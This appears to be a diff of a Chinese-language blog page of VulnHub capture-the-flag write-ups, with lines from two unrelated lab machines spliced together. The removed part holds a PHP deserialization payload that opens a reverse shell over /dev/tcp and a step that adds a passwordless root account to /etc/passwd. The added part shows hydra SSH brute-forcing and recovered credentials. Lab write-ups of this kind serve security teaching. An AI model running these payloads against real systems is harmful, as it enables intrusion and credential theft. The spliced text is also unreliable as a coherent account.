+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;package alienum;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.io.File;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.io.IOException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class Main &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	static String inputPath = &amp;quot;/Users/chentuo/JavaProjects/alienum/aliens.encrypted&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	static String outputPath = &amp;quot;/Users/chentuo/JavaProjects/alienum/aliens.txt&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	public Main() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	public static void main(String[] args) throws IOException, ClassNotFoundException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		String key = &amp;quot;w4rz0nerex0gener&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		File inputFile = new File(inputPath);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		File decryptedFile = new File(outputPath);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			alienum.Cryptor.decrypt(key, inputFile, decryptedFile);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125; catch (CryptoException var5) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			System.out.println(var5.getMessage());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			var5.printStackTrace();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1453.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
 &lt;blockquote&gt;
-&lt;p&gt;对页面到处点了点之后，没有看到可以直接利用的点。包括查看 robots 文件、查看网页源代码，查看是否有 git 文件泄漏，查看网站的框架、CMS 是否有可以直接利用的漏洞，查看页面中是否有敏感信息暴露出来如可疑的域名。&lt;/p&gt;
+&lt;p&gt;运行此文件之后，即可以在自己设置的目录下找到我们的解密文件，但是这个解密之后的 txt 文件不能用 cat 来查看会显示乱码，用 file 命令确定是一个 data 类型后，用 strings 查看得到了解密后的文件内容&lt;br&gt;
+ minotaur:m1nom1no…&lt;br&gt;
+scylla:scyscy…&lt;br&gt;
+echidna:ech1ech1…&lt;br&gt;
+cyclops:cyccyc…&lt;br&gt;
+anunnaki:nak1nak1…&lt;br&gt;
+anunnaki:nak1nak2…&lt;br&gt;
+anunnaki:nakinaki…&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;接下来就对网站进行目录扫描，扫描是否存在敏感的目录，指定后缀与字典开扫，我喜欢用的字典是 directory-list-2.3-medium.txt 比较全。&lt;br&gt;
- &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.31.83/&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1310.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;依次对识别到的目录进行访问：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODMvYmxvZy8=&#34;&gt;http://192.168.31.83/blog/&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1311.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;找到了两条信息，域名 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NlcmVhbC5jdGY=&#34;&gt;http://cereal.ctf&lt;/span&gt; , 另一个看网站的形式像是 wordpress.&lt;/p&gt;
-&lt;p&gt;修改本地 hosts 文件，将域名的 DNS 解析指向靶机 ip 地址。&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1312.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;再次打开网站，看一下页面有啥变化&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1313.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;wpscan-枚举&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wpscan-枚举&#34;&gt;#&lt;/a&gt; wpscan 枚举&lt;/h3&gt;
-&lt;p&gt;用 wpscan 进行一波扫描，枚举用户名&lt;br&gt;
- &lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://cereal.ctf/blog/ --enumerate u&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1314.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 得到两个用户名分别为 cereal 和 Cereal&lt;/p&gt;
-&lt;p&gt;一般只能收集到用户名、密码能收集到的情况比较少、我们就搜集一下试试&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc -U &#39;cereal,Cereal&#39; -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://cereal.ctf/blog/&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1315.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;果然密码搜集不出来，但是知道了域名的话就可以尝试目标网站是否存在子域名&lt;/p&gt;
-&lt;p&gt;尝试搜索子域名后无果，继续访问我们收集到的其他 web&lt;/p&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODMvYWRtaW4v&#34;&gt;http://192.168.31.83/admin/&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1316.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;一个后台的登陆地址，可以尝试弱口令，万能密码，sql 注入、burp 代理数据修改返回包、爆破密码、xss 攻击等。简单的试了试之后发现并没有什么很严重的弱点，就把现在的目标转到其他的网站上。&lt;/p&gt;
-&lt;h3 id=&#34;子域名收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#子域名收集&#34;&gt;#&lt;/a&gt; 子域名收集&lt;/h3&gt;
-&lt;p&gt;收集另一个开放的 web 站点的信息：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODM6NDQ0NDE=&#34;&gt;http://192.168.31.83:44441&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1317.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;收集这个站点的目录并没有什么有价值的信息&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1318.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;收集 44441 端口上是否存在一些子域名&lt;br&gt;
- &lt;code&gt;gobuster vhost -u http://cereal.ctf:44441 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1319.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;收集到了子域名 secure.cereal.ctf:44441&lt;/p&gt;
-&lt;p&gt;修改本地 hosts 文件，改变 DNS 解析指向为靶机 ip 地址&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1320.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;经过上述的信息收集，我们能得到的可以利用的漏洞很有可能就是在后来发现的这个子域名上。&lt;/p&gt;
-&lt;h3 id=&#34;继续信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#继续信息收集&#34;&gt;#&lt;/a&gt; 继续信息收集&lt;/h3&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NlY3VyZS5jZXJlYWwuY3RmOjQ0NDQx&#34;&gt;http://secure.cereal.ctf:44441&lt;/span&gt; 进行信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1321.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;发现了命令执行，但是输入；&amp;amp;| 都没有起作用后，截取数据包，看数据包中的内容是些什么&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1322.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;可以选在 burp 自带的 url 解码，也可以在线 url 解码&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1323.png&#34; width=&#34;640&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;如图依次点击可将原先的编码进行 url 解码&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1324.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;这是一个 php 反序列化漏洞，但是如果找不到源码的话很难去利用这个漏洞，寻找这个子域名下是否有一些目录存在&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://secure.cereal.ctf:44441/&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1325.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;扫的比较慢，而且大半天也没有什么发现&lt;/p&gt;
-&lt;h3 id=&#34;ffuf模糊测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ffuf模糊测试&#34;&gt;#&lt;/a&gt; ffuf 模糊测试&lt;/h3&gt;
-&lt;p&gt;换个字典换个工具跑  &lt;code&gt;ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://secure.cereal.ctf:44441/FUZZ&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1326.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;找到了一个 back_en 的备份文件夹&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1327.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;打开之后发现是没有权限去进入这个目录&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1328.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;但是这个目录是确实存在的，继续向下扫描看能否找到敏感文件&lt;br&gt;
- &lt;code&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://secure.cereal.ctf:44441/back_en/&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1329.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;找到一个备份文件 index.php.bak, 打开之后发现了源码&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1330.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;php反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php反序列化&#34;&gt;#&lt;/a&gt; php 反序列化&lt;/h3&gt;
-&lt;p&gt;看源代码可以规范代码的格式，阅读此处的 php 代码查看反序列化造成的原因&lt;br&gt;
- &lt;code&gt;view-source:http://secure.cereal.ctf:44441/back_en/index.php.bak&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1331.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;blockquote&gt;
-&lt;p&gt;isValid 默认为 False，从浏览器发送请求时，会进入 if，并检查该值是否为 IP 地址。&lt;br&gt;
-尝试注入命令时，它拒绝了输入，如果我们在请求中发送值 True，则根本不会执行 if 块。&lt;br&gt;
-会直接调用 ping 方法。通过 shell_exec 函数执行命令。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;需要先实例化、在进行序列化和url编码：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class pingTest &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  public $ipAddress = &amp;quot;;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.18/4444 0&amp;gt;&amp;amp;1 &amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  public $isValid = True;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;obj = NEW pingTest;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;serilaze= serialize(&lt;span class=&#34;variable&#34;&gt;$obj&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo urlencode($serilaze);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;可以在线 php 执行，输出内容如下&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1332.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;也可以用 php 去执行下面的代码&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1333.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;得到漏洞利用代码：&lt;br&gt;
- &lt;code&gt;O%3A8%3A%22pingTest%22%3A2%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A45%3A%22%3Bbash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.31.15%2F4444+0%3E%261+%22%3Bs%3A7%3A%22isValid%22%3Bb%3A1%3B%7D&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;将 payload 发送到 burp 中，用 burp 发送此恶意数据&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1334.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;同时在 kali 上监听端口，得到了反弹的 shell，并进行终端优化&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1335.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;ln-软连接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ln-软连接&#34;&gt;#&lt;/a&gt; ln 软连接&lt;/h3&gt;
-&lt;p&gt;上 pspy 监控看看，看到了一个脚本被定期执行&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1336.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
-&lt;blockquote&gt;
-&lt;p&gt;chown 是用来改变用户和用户组权限的，这个脚本可以更改位于用户 rocky 的主目录中的文件 public_html 内容的所有者，当前用户 apache 组，apache 用户可以访问目录中的文件&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1337.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;尝试直接修改 /etc/passwd 中的用户，生成一个无密码的是 root 权限的账户&lt;br&gt;
- &lt;code&gt;ln -s /etc/passwd /home/rocky/public_html/etcpasswd&lt;/code&gt; &lt;br&gt;
- &lt;code&gt;ln -s&lt;/code&gt;  后，对添加软连接的地方做出改变则原文件也发生了改变&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1338.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;等待定时任务被执行后，/etc/passwd 就会因为我们设置的软连接&lt;br&gt;
- /home/rocky/public_html/etcpasswd 的权限被修改为 rocky:apache，而&lt;br&gt;
- /etc/passwd 的权限也被改变为了 apache 可操作的文件&lt;/p&gt;
-&lt;h3 id=&#34;root密码置空&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#root密码置空&#34;&gt;#&lt;/a&gt; root 密码置空&lt;/h3&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;code&gt;echo &amp;quot;mhq::0:0:root:/root:/bin/bash&amp;quot; &amp;gt;&amp;gt; /etc/passwd&lt;/code&gt; &lt;br&gt;
- 删除了 x，也就是删除 root 用户的密码身份验证&lt;br&gt;
-通过 su mhq 可以直接无密码升级到 root 权限&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1339.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;可以检验一下，现在我们 root 密码仍然未知，但是 mhq 的用户密码 x 不存在&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1340.png&#34; width=&#34;410&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 可以直接通过一个普通用户提权到 root&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1454.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;sshpass-连接靶机&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sshpass-连接靶机&#34;&gt;#&lt;/a&gt; sshpass 连接靶机&lt;/h3&gt;
+&lt;p&gt;得到了一串用户名和密码的组合，可能是 ssh 的用户和密码&lt;br&gt;
+ &lt;code&gt;cat aliens.txt | cut -d &#39;:&#39; -f 1 &amp;gt; user.txt&lt;/code&gt; &lt;br&gt;
+ &lt;code&gt;cat aliens.txt | cut -d &#39;:&#39; -f 2 &amp;gt; pass.txt&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1455.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;检查一下用户名和密码文件是否正确&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1456.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1457.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;&lt;code&gt;hydra -L user.txt -P pass.txt ssh://192.168.31.53 -f -t 32 -I -vV&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1458.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1459.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;用 ssh 成功连接到了靶机中&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1460.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;第一次登陆成功之后，第二次就可以用 sshpass 在命令行输入密码直接连接&lt;br&gt;
+ &lt;code&gt;sshpass -p nak1nak1.. ssh anunnaki@192.168.0.186&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1461.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;java代码分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#java代码分析&#34;&gt;#&lt;/a&gt; java 代码分析&lt;/h3&gt;
+&lt;p&gt;检索服务器文件，看到提示文件与一个 gpg 的加密文件，info.txt 提示要用–batch 来解密 gpg 文件，否则不会让输入密码&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1462.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;然而直接解密是可以弹出来输入密码的界面的，输入 ssh 爆破出来的密码 nak1nak1… 可以成功解密 gpg 为 jar 文件&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1463.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;同样的下载到本地，用 jd-gui 打开，开始阅读源码，Cryptor.class 里边定义了一个加、解密方法&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1464.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;Main.class 中设有盐值，并且在条件判断正确时为打印 passwd&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1465.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;Recources.class 里边是一些加密的字符串&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1466.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;编写 java 代码，进行解密，代码内容如下&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import java.security.NoSuchAlgorithmException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import javax.crypto.BadPaddingException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import javax.crypto.IllegalBlockSizeException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import javax.crypto.NoSuchPaddingException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class Main &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	public static void main(String[] args) throws NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Cryptor cryptor = new Cryptor();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	String plaintext = cryptor.decrypt(cryptor.decrypt(&amp;quot;pr0tect1on1smust&amp;quot;, &amp;quot;/aom7EHcuiCWzNArA72UVn0nnVtJ5jZSPHDmjFPc5KQ=&amp;quot;), &amp;quot;jJ2Mrz4wjZDMSPwDr6TolQ==&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	System.out.println(&amp;quot;[+] Success, the password is : &amp;quot; + plaintext);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1467.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;运行代码，成功解密出来了密码为 ufo_phosXEN&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1468.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
